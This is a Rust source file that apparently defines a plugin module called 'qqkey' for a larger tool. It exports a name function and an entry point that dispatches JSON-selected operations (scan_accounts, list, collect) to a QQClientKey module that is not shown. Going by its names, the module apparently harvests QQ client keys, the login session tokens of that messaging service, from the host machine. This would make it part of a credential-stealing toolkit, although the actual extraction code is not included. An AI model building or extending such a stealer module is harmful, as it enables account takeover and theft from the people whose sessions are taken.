//!
//!
//!   module_name() -> *const u8
//!   module_main(input, input_len, output, output_cap) -> usize

mod qq_clientkey;

#[no_mangle]
pub extern "C" fn module_name() -> *const u8 {
    concat!("qqkey", "\0").as_ptr() as *const u8
}

#[no_mangle]
pub unsafe extern "system" fn module_main(
    input: *const u8,
    input_len: usize,
    output: *mut u8,
    output_cap: usize,
) -> usize {
    let input_json = if input.is_null() || input_len == 0 {
        "{}".to_string()
    } else {
        String::from_utf8_lossy(std::slice::from_raw_parts(input, input_len)).to_string()
    };

    let op = serde_json::from_str::<serde_json::Value>(&input_json)
        .ok()
        .and_then(|v| v.get("op").and_then(|o| o.as_str()).map(String::from))
        .unwrap_or_default();

    let result = if op == "scan_accounts" {
        run_async(qq_clientkey::QQClientKey::scan_accounts())
    } else if op == "list" {
        run_async(qq_clientkey::QQClientKey::list())
    } else {
        run_async(qq_clientkey::QQClientKey::collect())
    };
    write_output(&result, output, output_cap)
}

fn run_async<F: std::future::Future<Output = String>>(f: F) -> String {
    tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
        .map(|rt| rt.block_on(f))
        .unwrap_or_else(|e| format!(r#"{{"error":"runtime: {}"}}"#, e))
}

fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
    let bytes = s.as_bytes();
    let n = bytes.len().min(output_cap);
    if n > 0 && !output.is_null() {
        unsafe {
            std::ptr::copy_nonoverlapping(bytes.as_ptr(), output, n);
        }
    }
    n
}
